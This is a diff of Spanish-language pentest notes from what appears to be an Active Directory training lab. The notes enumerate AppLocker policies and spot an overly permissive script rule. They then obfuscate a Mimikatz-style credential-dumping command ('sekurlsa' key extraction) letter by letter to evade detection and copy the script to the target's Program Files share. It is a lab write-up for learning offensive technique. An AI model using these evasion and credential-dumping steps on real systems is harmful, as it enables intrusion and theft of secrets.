@@ -442,8 +442,123 @@ Find-PSRemotingLocalAdminAccess
 ```
 
 Vemos que tenemos tenemos privilegios de administrador local en adminsrv
-Nos conectaremos a la maquina, y verificaremos si tiene el Applocker configurado
+A continuación vamos a enumerar los servicios corriendo en esta maquina
+```shell
+sc query
+```
+
+En caso de querer buscar un servicio en concreto como este caso *AppLocker*, utiliza un servicio del que depende llamado *AppIDSvc*
+```shell
+sc query AppIDSvc
+```
+
+Una vez confirmemos que este servicio existe, buscaremos si existe la configuración de *AppLocker*
 ```shell
 reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
+```
+
+La respuesta nos desvela que este esta configurado, además de mostrarnos las políticas definidas para múltiples tipos de ejecución
+Para saber si hay alguna regla/política demasiado permisiva haremos la siguiente enumeración en cada resultado obtenido en la salida anterior
+```shell
+reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\<ruta>
+```
+
+A continuación enumeraremos estas enumerando uno por uno los *GUID*
+```shell
+reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\<ruta>\<GUID>
+```
+
+Una ves la enumeremos tenemos que prestar atención a parámetros que pueden hacer que estas sean demasiado permisivas, los parámetros son:
+- *UserOrGroupSid = S-1-1-0* -> Aplica a todo el mundo
+- *AuthenticatedUsers* -> Aplica a todo el mundo
+- *Action="Allow"* -> Regla que permite, suelen ser las mas vulnerables
+- *FilePathCondition Path="..."* -> Dependen de rutas, son las mas débiles, si el *path* incluye *`*`* es mas vulnerable aun o si tiene variables peligrosas como *%WINDIR%\** o *%TEMP%\** 
+- *FilePublisherCondition* -> Permiten por firma digital siendo muy peligroso si son muy genéricos *`*`* o muy amplio *MICROSOFT CORPORATION* pudiendo abusar de *LOLBins*
+
+Encontramos una regla muy permisiva en
+```shell
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
+```
+
+Ya que es una regla predeterminada que permite a todos ejecutar scripts desde *C:\ProgramFiles*
+También podemos enumerar estas detrás de una forma mas clara usando una conexión remota desde nuestro propio equipo, realizaremos la conexión remota usando el siguiente comando que nos otorgara una *PowerShell*
+
+```shell
+Enter-PSSession dcorp-adminsrv
+```
+
+Podemos enumerar el tipo de lenguaje que usa
+```shell
+ $ExecutionContext.SessionState.LanguageMode
+```
+Te muestra el tipo de lenguaje de PowerShell implementado siendo *FullLanguage* -> sin restricciones, *ConstrainedLanguage* -> muy limitado y *NoLanguage* -> casi bloqueado
+En esta caso es *ConstrainedLanguage*
+
+Y una vez en la conexión Obtendremos las políticas de *AppLocker* de la maquina
+```shell
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+
+Volviendo a ver que cualquier persona puede ejecutar scripts desde *C:\ProgramFiles*
+No se nos permite ejecutar scripts usando el origen de puntos *. .\Invoke-Mimi.ps1*, por lo que tendremos que modificar el script e incluir una propia llamada a la función en el propio script
+
+Vamos a crear el nuevo *Invoke-TheKat* le llamaremos de la siguiente forma: *Invoke-TheKatEx-keys-std97.ps1*
+Primero tendremos que crear una copia del  *Invoke-TheKat* original y cambiarle el nombre a *Invoke-TheKatEx-keys-std97.ps1*
+Una vez le hayamos cambiado el nombre le damos clic derecho y editar, tendremos que sustituir el contenido de las ultimas líneas por:
+```shell
+$jq = "t";
+$hk = "o";
+$cr = "k";
+$dg = "e";
+$z3 = "n";
+$y4 = ":";
+$fq = ":";
+$67 = "e";
+$qj = "v";
+$27 = "a";
+$yt = "s";
+$ws = "i";
+$h4 = "v";
+$li = "e";
+$tv = "-";
+$2h = "e";
+$qx = "l";
+$lx = "e";
+$l1 = "v";
+$68 = "a";
+$5d = "t";
+$ny = "e";
+$25 = " ";
+$d9 = "s";
+$9z = "e";
+$8x = "k";
+$r2 = "u";
+$6x = "r";
+$zq = "l";
+$06 = "s";
+$td = "a";
+$hb = ":";
+$gz = ":";
+$nx = "e";
+$0n = "v";
+$qz = "a";
+$ct = "s";
+$mj = "i";
+$ue = "v";
+$sf = "e";
+$2c = "-";
+$9u = "e";
+$hp = "k";
+$x0 = "e";
+$yb = "y";
+$r1 = "s";
+$Pwn = $jq + $hk + $cr + $dg + $z3 + $y4 + $fq + $67 + $qj + $27 + $yt + $ws + $h4 + $li + $tv + $2h + $qx + $lx + $l1 + $68 + $5d + $ny + $25 + $d9 + $9z + $8x + $r2 + $6x + $zq + $06 + $td + $hb + $gz + $nx + $0n + $qz + $ct + $mj + $ue + $sf + $2c + $9u + $hp + $x0 + $yb + $r1 ;
+
+Invoke-TheKat -Command $Pwn
+```
+
+Ahora una vez el archivo modificado lo transferiremos a la maquina victima
+```shell
+Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 ```
 
